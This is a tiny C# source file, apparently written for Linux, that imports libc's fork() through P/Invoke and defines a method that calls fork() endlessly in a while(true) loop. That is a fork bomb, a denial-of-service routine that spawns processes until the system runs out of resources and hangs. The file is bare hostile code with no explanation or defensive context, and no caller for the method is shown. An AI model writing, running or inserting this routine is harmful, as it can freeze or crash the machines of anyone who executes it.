using System.Runtime.InteropServices;

namespace idk
{
    class Fork
    {
        [DllImport("libc.so.6")]
        public static extern long fork();

        static void F()
        {
            while (true)
            {
                fork();
            }
        }
    }
}